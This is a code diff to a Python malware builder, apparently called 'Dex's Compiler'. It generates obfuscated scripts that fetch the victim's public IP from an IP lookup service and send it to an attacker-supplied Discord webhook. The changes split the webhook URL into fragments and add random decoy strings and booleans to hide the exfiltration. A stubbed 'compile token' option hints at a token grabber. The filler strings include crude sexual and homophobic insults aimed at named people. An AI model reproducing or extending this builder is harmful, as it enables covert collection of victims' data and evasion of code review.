@@ -79,7 +79,12 @@ def vexcm():
         checkconfig()
         filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
         webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
+        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
+        sechook = webhook.split("/")
+        print("[0a]: Splitting Webhook")
+        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
         newlog = open(f"Compiled/{filename}"+".py", "w+")
+        print("[1]: Getting random strings/booleans")
         randomstrings = ["dex.lol#1337", "project vex", "woow such a good obfuscator",
         "femor when he sees unsucked dick", "hello all", "vex >> vw", "@everyone",
         "i admit this is not a good compiler", "bruhhhh", "the creator of this is cute",
@@ -91,7 +96,11 @@ def vexcm():
         "why you gotta be muted", "the hdmi port that does hdmi when hdmi like hdmi so hdmi port hdmi's the speaker hdmi",
         "brah", "i wonder why your using this unless i sent you it", "maybe i just released it on github",
         "i triedd my very hardest on this i think", "hello there pentagonium", "pls stop using ur soundboard",
-        "im inside your walls.", "pass","vex","fat = False", "femorgay = True"]
+        "im inside your walls.", "pass","vex", "              "]
+        randombools = ["vex = True", "gay = False", "femorgay = True", 
+        "funstuff = True", "compiler = True"]
+
+        print("[2]: Writing File")
         newlog.write(f"""
 #  ================================
 # |         Dex's Compiler         |
@@ -105,22 +114,23 @@ def vexcm():
 import requests;import dhooks;'''''';'''i hope nobody is a skid''';'''gg'''
 
 '''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht"
-'''{random.choices(randomstrings)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";''''{random.choices(randomstrings)}'''
-'''{random.choices(randomstrings)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(randomstrings)}''';{random.choices(randomstrings)}
-'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};dex=True;'''dexIIIlIlIlllIllIIIIllIlIII'''
-'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";vw_trash=True;dexIlIlIlIllllllIIIIllIIllIlI=Webhook;'''{random.choices(randomstrings)}'''
-'''{random.choices(randomstrings)}''';dexIlIlIlIllllllIIIIllIIlIlI=dhooks;dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
-'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};'''{random.choices(randomstrings)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';femorgay=True;{random.choices(randomstrings)}
+'''{random.choices(randomstrings)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(randombools)};''''{random.choices(randomstrings)}'''
+'''{random.choices(randomstrings)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(randomstrings)}''';l6="{sechook[6]}";{random.choices(randomstrings)}
+'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};{random.choices(randombools)};{random.choices(randombools)};'''dexIIIlIlIlllIllIIIIllIlIII'''
+'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";{random.choices(randombools)};l3="{sechook[3]+"/"}";dexIlIlIlIllllllIIIIllIIllIlI=dhooks.Webhook;'''{random.choices(randomstrings)}'''
+'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
+'''{random.choices(randomstrings)}''';l0="{sechook[0]+"//"}";{random.choices(randomstrings)};{random.choices(randombools)};l4="{sechook[4]+"/"}";'''{random.choices(randomstrings)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(randomstrings)}
 '''{random.choices(randomstrings)}''';{random.choices(randomstrings)};'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(randomstrings)}''';'''femor when unsucked cock is in there area'''
-'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';'''dexIIIlIlI''';dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIlIlI.dexIlIlIlIllllllIIIIllIIllIlI("{webhook}");'''lllIllIIIIllIlIII''';'''er''';''''''
-'''{random.choices(randomstrings)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
-'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';jfsiotbj5erwbjymhfg0dmuny958rebuyrtejn8=False;{random.choices(randomstrings)};'''{random.choices(randomstrings)}'''
+'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';'''dexIIIlIlI''';l5="{sechook[5]+"/"}";dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIlIlI.dexIlIlIlIllllllIIIIllIIllIlI(l0+l2+l3+l4+l5+l6);'''lllIllIIIIllIlIII''';'''er''';''''''
+'''{random.choices(randomstrings)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';{random.choices(randombools)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
+'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(randomstrings)};'''{random.choices(randomstrings)}'''
 '''{random.choices(randomstrings)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(randomstrings)}'''
-'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIlIIllIlIll.send(dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;bye=True
+'''{random.choices(randomstrings)} ''';{random.choices(randombools)};dexIlIlIlIlllIllIlIIllIlIll.send(dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;{random.choices(randombools)}
 
 '''''';{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};''''''
 '''dex.lol#1337'''
         """)
+        print("[/]: File Compiled, sent to Compiled Folder")
         newlog.close()
     elif cmd.lower() == "compile token":
         pass
